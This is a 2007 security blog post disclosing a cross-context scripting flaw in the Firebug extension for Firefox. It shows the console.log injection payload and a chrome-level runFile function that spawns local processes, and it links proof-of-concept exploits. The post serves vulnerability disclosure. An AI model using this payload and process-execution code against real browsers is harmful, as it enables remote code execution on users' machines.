---
title: Firebug Goes Evil
author: petko-d-petkov
date: Wed, 04 Apr 2007 19:12:38 GMT
template: post.jade
---

Firebug is a very powerful JavaScript debugger for Firefox. "I love it!" It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests.

Firebug is mainly used by web developers to find bugs in their code but it can also be used from security guys like me to find and explore various client-side and server-side vulnerabilities. Firebug is my best buddy. I even partially based [Technika](/blog/technika), the bookmarklets powertool, on the top of Firebug.

Unfortunately, Firebug suffers from rather simple but quite dangerous vulnerability. I have [discussed](/blog/cross-context-scripting-with-sage/) similar issues before. In general, browsers try their best to prevent common vulnerabilities from crippling into their code. However, that's not the case with browser extensions. Very often, browser extension authors do not consider the security aspects of their work, i.e. extensions are not carefully inspected for security vulnerabilities. Because of this, incidents occur. IMHO, the next wave of browser attacks will target exactly this.

In this post I am going to disclose a vulnerability for Firebug which can be used by attackers to gain control of every system where the Firebug extension is installed. Of course, the user needs to visit a malicious page first, which means that the attack surface is greatly reduced. However, given the fact that the largest user base of the Firefox browser are geeks and Firebug is a top extension at [http://addons.mozilla.org](http://addons.mozilla.org), attackers can cause quite a lot of trouble.

The vulnerability is of a type Cross-zone or Cross-context scripting, where a script from a web pages is injected inside the zone of the browser, also know as the chrome, or in the zone of the file: protocol. In both cases the result is quite devastating, although the second is a bit less critical then the first. Remote scripts in the browser are restricted by a sandbox. This means that everything that is prefixed with http: or https: is secure. Browser extensions make use of the chrome: protocol. This protocol is not restricted at all and everything is allowed. In that respect, browser extensions are trusted. However if a remote script, tricks the browser into executing JavaScript expressions on chrome: then this script can take control of the entire chrome and also the underplaying operating system because then command execution and read/write file access operations are allowed.

In order to cause Cross-zone scripting in Firebug you need to do the following:

```javascript
console.log({'<script>alert("bing!")</script>':'exploit'})
```

If you put this JavaScript expression into a page and open it with the browser while Firebug is on, you will be prompted with an alert box. This is not very interesting but there is a lot more you can do then that. For example, attackers can easily inject the following function into the browser chrome:

```javascript
function runFile(f) {
        var file = Components.classes["@mozilla.org/file/local;1"]
                .createInstance(Components.interfaces.nsILocalFile);

        file.initWithPath(f);

        var process = Components.classes["@mozilla.org/process/util;1"]
                .createInstance(Components.interfaces.nsIProcess);

        process.init(file);

        var argv = Array.prototype.slice.call(arguments, 1);

        process.run(true, argv, argv.length);
}
```

The function `runFile` allows execution of files. With the function declaration in the browser chrome, attackers can call `console.log` a few more times to spawn any file they want or even silently install browser extensions, not to mention that they will be able to read and write the file system too. The possibilities for evilness are endless.

There is a catch though. The Cross-context scripting vector is very tiny. In order to exploit the vulnerability, I needed to go through some extreme things like dynamically composing the malicious payload in a string then evaluating the string content inside the chrome. I wrote two ([1](/files/2007/04/firebug-poc.htm), [2](/files/2007/04/firebug-poc2.htm)) Proof of Concept exploits that you can try out.

_It is highly recommended that you disable Firebug until this issue is fixed which I have no doubt that it will be quite soon._
